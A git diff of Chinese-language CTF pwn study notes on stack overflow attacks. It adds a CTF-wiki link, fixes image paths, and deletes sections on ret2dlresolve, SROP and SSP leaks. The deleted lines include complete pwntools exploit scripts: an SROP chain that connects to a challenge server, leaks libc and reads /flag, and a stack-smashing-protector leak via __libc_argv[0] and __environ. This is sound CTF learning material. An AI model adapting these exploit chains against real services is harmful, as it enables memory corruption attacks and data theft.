@@ -1,6 +1,9 @@
 # Stack
 
-我这里记录一个比较典型的栈溢出攻击payload：
+我这里记录一些比较典型的栈溢出攻击payload，可以从脚本中看看每一个模块的思路
+
+更详细的内容可以看：
+[CTF_WIKI](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/)
 
 # 栈溢出
 
@@ -74,7 +77,7 @@ sh.interactive()
 
 ## `libc2csu`
 
-![Untitled](Stack%2095229ecbb2f1486a9533db3b1ce3a54d/Untitled.png)
+![Untitled](Untitled.png)
 
 ```python
 from pwn import *
@@ -144,7 +147,7 @@ sh.interactive()
 
 ## 栈迁移
 
-![Untitled](Stack%2095229ecbb2f1486a9533db3b1ce3a54d/Untitled%201.png)
+![Untitled](Untitled%201.png)
 
 ```python
 from pwn import *
@@ -220,7 +223,7 @@ p.interactive()
 
 当使用了栈迁移的时候，栈内存如下：
 
-![Untitled](Stack%2095229ecbb2f1486a9533db3b1ce3a54d/Untitled%202.png)
+![Untitled](Untitled%202.png)
 
 ### 小技巧
 
@@ -255,9 +258,6 @@ io.interactive()
 
 - `canary`以`\x00`结尾，目的是为了隔离字符串，但是我们如果可以直接将字符串写到canary的末尾，就可以泄露`canary`，用这个`canary`的值重新写回，来构造payload
 
-## ret2dlresolve
-
-[【ret2dlresolve】学习和体会](Stack%2095229ecbb2f1486a9533db3b1ce3a54d/%E3%80%90ret2dlresolve%E3%80%91%E5%AD%A6%E4%B9%A0%E5%92%8C%E4%BD%93%E4%BC%9A%20dd7da26e1a564d8ab96be08417894fa9.md)
 
 ## BROP
 
@@ -431,125 +431,7 @@ sh.sendline(payload)
 sh.interactive()
 ```
 
-## SROP
 
-srop是我研究了有个两三天的东西，因为最近很忙，所以一直没有进行全身心的投入。
-
-但是研究下来发现，这个东西的主要重点其实就是在对`sigreturn` 这一个系统调用的使用上，它虽然原理很复杂，但是实际上也就是对syscall的使用。
-
-具体使用上，pwntools集成了对于Srop的调用
-
-```python
-frame = SigreturnFrame()
-frame.rdi = 59        # exec的系统调用 这里是由于汇编代码之前进行了mov rdi,rax的调用所以才这么写
-frame.rsi = bss - 0x30
-frame.rdx = 0
-frame.rcx = 0
-frame.rsp = bss + 0x38
-frame.rip = syscall
-```
-
-```bash
-cat /usr/include/asm/unistd_64.h
-```
-
-有一道来自0xgame 2023的例题可以表示一下SROP的用法
-
-![Untitled](Stack%2095229ecbb2f1486a9533db3b1ce3a54d/Untitled%203.png)
-
-```jsx
-from pwn import *
-from LibcSearcher import *
-
-debug = 1
-gdb_is = 1
-# context(arch='i386',os = 'linux', log_level='DEBUG')
-context(arch='amd64', os='linux', log_level='DEBUG')
-
-#r = process("./pwn")
-r = remote("8.130.35.16",55003)
-
-elf = ELF('./pwn')
-libc = ELF('./libc.so.6')
-pop_rdi = 0x0401443
-pop_rsi_r15 = 0x0401441
-ret_addr = 0x40101a
-
-bss_addr = 0x404100
-base_addr = bss_addr + 0x8
-syscall_addr = elf.sym['syscall']
-payload = b'A' * 8 + b'junkjunk'
-syscall_got = elf.got['syscall']
-
-#使用pwntools的SigreturnFrame()帮助构造结构体
-frame_write = SigreturnFrame()
-frame_write.rdi = 1
-frame_write.rsi = 1
-frame_write.rdx = syscall_got  #泄露libc地址
-frame_write.rcx = 0x8
-frame_write.rip = syscall_addr
-frame_write.rsp = base_addr + 0xF0 + 0x8 * 4  #一个SigreturnFrame()大小0xF0 控制栈顶
-
-frame_read_data = SigreturnFrame()
-frame_read_data.rdi = 0  #由于syscall之前对寄存器做了移位，所以不是rax
-frame_read_data.rsi = 0
-frame_read_data.rdx = bss_addr
-frame_read_data.rcx = 0x228
-frame_read_data.rsp = base_addr  #由于不知道栈的地址，将其迁移到bss段进行控制
-frame_read_data.rip = syscall_addr  #直接调用syscall运行设置的函数
-# first send
-payload += p64(pop_rdi) + p64(0xf) + p64(syscall_addr) + bytes(frame_read_data)
-
-r.send(payload)
-time.sleep(1)
-
-#----------------------------------------
-
-frame_read_data = SigreturnFrame()
-frame_read_data.rdi = 0
-frame_read_data.rsi = 0
-frame_read_data.rdx = bss_addr + 0x100
-frame_read_data.rcx = 0x8 * 30
-frame_read_data.rsp = base_addr + 0x100
-frame_read_data.rip = syscall_addr
-
-payload_read = p64(pop_rdi) + p64(0xf) + p64(syscall_addr) + bytes(
-    frame_read_data)
-# second send
-payload = p64(0) + p64(pop_rdi) + p64(0xf) + p64(syscall_addr) + bytes(frame_write)
-payload += p64(pop_rdi) + p64(0xf) + p64(syscall_addr) + bytes(frame_read_data)
-#gdb.attach(r)
-r.send(payload)
-
-#泄露libc地址
-#----------------------------------------
-libc_syscall_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
-
-libc = LibcSearcher('syscall',libc_syscall_addr)
-libc_base = libc_syscall_addr - libc.dump('syscall')
-open_addr = libc_base + libc.dump("open")
-write_addr = libc_base + libc.dump("write")
-read_addr = libc_base + libc.dump("read")
-
-info(f'libc_syscall_addr = {hex(libc_syscall_addr)}')
-info(f'libc_base = {hex(libc_base)}')
-
-pop_rsi = 0x0002601f + libc_base
-pop_rdx = 0x00142c92 + libc_base
-syscall_addr = syscall_addr + 23  #此处将syscall的移位去掉了
-pop_rax = 0x0036174 + libc_base
-
-time.sleep(1)
-#ORW
-payload = b'/flag\x00\x00\x00'+p64(pop_rdi)+p64(bss_addr + 0x100) + p64(pop_rsi) + p64(0)+ p64(open_addr)
-payload +=p64(ret_addr)+ p64(pop_rdi)+p64(3) + p64(pop_rsi) + p64(bss_addr+0x300) + p64(pop_rdx) + p64(0x100) + p64(read_addr)
-payload +=p64(ret_addr)+ p64(pop_rdi)+p64(1) + p64(pop_rsi) + p64(bss_addr+0x300) + p64(pop_rdx) + p64(0x100) + p64(write_addr)
-
-#bss_addr + 0x8 * 25 是flag的位置
-
-r.send(payload)
-r.interactive()
-```
 
 # 静态编译
 
@@ -580,108 +462,4 @@ sh.recv(timeout =1)
 sh.interactive()
 ```
 
-## SSP攻击
 
-[CTF-pwn 技术总结（3）](https://sf2333.github.io/2022/02/01/CTF-pwn-%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%883%EF%BC%89/)
-
-[SSP leak - 先知社区](https://xz.aliyun.com/t/12672)
-
-```python
-p &__libc_argv[0] #用于查找到__libc_argv[0]的地址，在ssp攻击中很常用
-```
-
-华为杯研究生比赛中遇到的一道题，关于ssp攻击
-
-ssp攻击主要是利用了这个原理：在包含canary的二进制文件，如果检测到了canary被修改，那么会直接输出此二进制文件名
-
-![Untitled](Stack%2095229ecbb2f1486a9533db3b1ce3a54d/Untitled%204.png)
-
-二进制文件名存贮在`__libc_argv[0]`中，所以只要我们覆盖了这个地址，就可以直接进行任意地址泄露
-
-同时，在libc中有一个变量，叫做`__environ`，这个变量储存着此时栈的地址，并且指向的地址是`__libc_argv[0]+0x10`
-
-```python
-from pwn import *
-from LibcSearcher import *
-#context.log_level = 'debug'
-
-arg_0 = 0x7fffffffe328
-what_to_do = 0x7fffffffe200
-ebp = 0x7fffffffe1f0
-
-sh = process("./pwn")
-#sh = remote("172.10.0.4","10085")
-elf = ELF("./pwn")
-libc = ELF("./libc-2.23.so")
-what_to_do - ebp-0x40
-en_flag = ebp - 0xa4
-offset = arg_0 -what_to_do
-
-puts_plt = elf.plt['puts']
-puts_got = elf.got['puts']
-
-#sh = remote("172.10.0.4","10085")
-payload =  cyclic(offset)+p64(puts_got)
-# first
-sh.recvuntil(b"What's your name?\n")
-sh.sendline(b'aaaa')
-
-sh.recvuntil(b"What do you want to do?\n")
-sh.sendline(payload)
-
-sh.recvuntil(b"detected ***:")
-puts_addr = u64(sh.recvuntil(b" terminated\n",drop = True)[-6:].ljust(8,b"\x00"))
-
-print(hex(puts_addr))
-
-libc_base = puts_addr - libc.sym["puts"]
-
-print(hex(libc_base))	
-# second
-sh.recvuntil(b"What's your name?\n")
-sh.sendline(b'aaaa')
-
-sh.recvuntil(b"What do you want to do?\n")
-
-payload = cyclic(offset)+p64(libc_base + libc.sym['__environ'])
-sh.sendline(payload)
-
-sh.recvuntil(b"detected ***:")
-environ_addr = u64(sh.recvuntil(b" terminated\n",drop = True)[-6:].ljust(8,b"\x00"))
-
-print(hex(environ_addr))
-	
-# third
-print("3")
-sh.recvuntil(b"What's your name?\n")
-sh.sendline(b'aaaa')
-rand_id = int(sh.recvuntil(b"\n",drop = True)[-2:])
-
-print(rand_id)
-
-sh.recvuntil(b"What do you want to do?\n")
-#gdb.attach(sh)
-#pause()
-payload = cyclic(offset)+p64(environ_addr-376)
-print("addr:")
-print(hex(environ_addr-376))
-sh.sendline(payload)
-
-sh.recvuntil(b"detected ***:")
-flag = sh.recvuntil(b" terminated\n",drop = True)
-print(flag)
-
-new_flag = b''
-
-for i in flag:
-	new_flag+=bytes([i ^ rand_id])
-	
-print(new_flag)
-sh.interactive()
-```
-
-![Untitled](Stack%2095229ecbb2f1486a9533db3b1ce3a54d/Untitled%205.png)
-
-# 文件相关
-
-[文件系统](Stack%2095229ecbb2f1486a9533db3b1ce3a54d/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%20d1631c97226d41689b3e5eae530cfe55.md)
